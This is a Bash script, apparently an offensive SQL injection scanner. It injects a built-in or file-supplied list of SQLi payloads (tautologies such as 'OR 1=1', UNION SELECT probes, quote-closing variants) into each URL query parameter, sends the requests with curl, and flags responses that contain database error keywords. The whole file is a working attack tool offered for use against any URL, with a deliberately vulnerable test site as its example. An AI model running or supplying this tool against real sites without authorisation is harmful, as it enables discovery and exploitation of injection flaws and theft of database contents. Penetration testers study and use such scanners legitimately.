#!/bin/bash

# SQLi Payload Injector
# Usage: ./SQL.sh -u "http://example.com/page.php?param=value" [-f payloads.txt] [-o output.txt]

RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

default_payloads=(
  "0 OR 1=1 -- "
  "0 OR 1=1#"
  "0 OR 1=1/*"
  "0 OR 1=1 LIMIT 1--"
  "0 OR 1=1 UNION SELECT NULL,NULL,NULL--"
  "0) OR 1=1 -- "
  "0') OR 1=1 -- "
)

print_usage() {
  echo -e "Usage: $0 -u <url_with_param> [-f <payload_file>] [-o <output_file>]"
  echo -e "Example: $0 -u \"http://testphp.vulnweb.com/listproducts.php?cat=1\""
  exit 1
}

while getopts ":u:f:o:h" opt; do
  case $opt in
    u) url="$OPTARG" ;;
    f) file="$OPTARG" ;;
    o) output="$OPTARG" ;;
    h) print_usage ;;
    *) print_usage ;;
  esac
done

if [[ -z "$url" ]]; then
  echo -e "${RED}[!] URL is required. Use -u <url>${NC}"
  print_usage
fi

output="${output:-sql-log.txt}"
echo "[*] SQL Injection Log for $url" > "$output"

# Load payloads
payloads=()
if [[ -n "$file" && -f "$file" ]]; then
  echo -e "${BLUE}[*] Using payloads from file: $file${NC}"
  while IFS= read -r line; do
    [[ -n "$line" ]] && payloads+=("$line")
  done < "$file"
else
  echo -e "${BLUE}[*] Using default SQLi payloads${NC}"
  payloads=("${default_payloads[@]}")
fi

# Function to inject payload into URL parameters
inject_payload() {
  local base_url="$1"
  local payload="$2"

  # Extract base (before '?') and query string (after '?')
  local base="${base_url%%\?*}"
  local query="${base_url#*\?}"

  # If no query string, just append
  if [[ "$query" == "$base_url" ]]; then
    # no parameters to inject into, append payload directly (encoded)
    encoded_payload=$(printf '%s' "$payload" | jq -s -R -r @uri)
    echo "${base}?${encoded_payload}"
    return
  fi

  # For each param=value pair, inject payload into the value
  local new_query=""
  IFS='&' read -ra params <<< "$query"
  for i in "${!params[@]}"; do
    param="${params[$i]}"
    key="${param%%=*}"
    val="${param#*=}"

    # Inject payload by replacing the value with val + payload
    new_val="${val}${payload}"

    # URL encode new_val
    encoded_val=$(printf '%s' "$new_val" | jq -s -R -r @uri)

    # Rebuild param
    new_param="${key}=${encoded_val}"

    if [[ $i -eq 0 ]]; then
      new_query="$new_param"
    else
      new_query="${new_query}&${new_param}"
    fi
  done

  echo "${base}?${new_query}"
}

for payload in "${payloads[@]}"; do
  target_url=$(inject_payload "$url" "$payload")
  echo -e "${BLUE}[+] Testing payload: $payload${NC}"
  response=$(curl -s "$target_url")

  if echo "$response" | grep -Ei "sql|syntax|error|mysql|odbc|pdo|exception"; then
    echo -e "${RED}[!] SQLi detected! Payload: $payload${NC}"
    echo "[!] $payload" >> "$output"
    echo "$target_url" >> "$output"
  else
    echo -e "${GREEN}[-] No error or reflection.${NC}"
  fi

  sleep 1
done

echo -e "${BLUE}[*] Done. Output saved to $output${NC}"
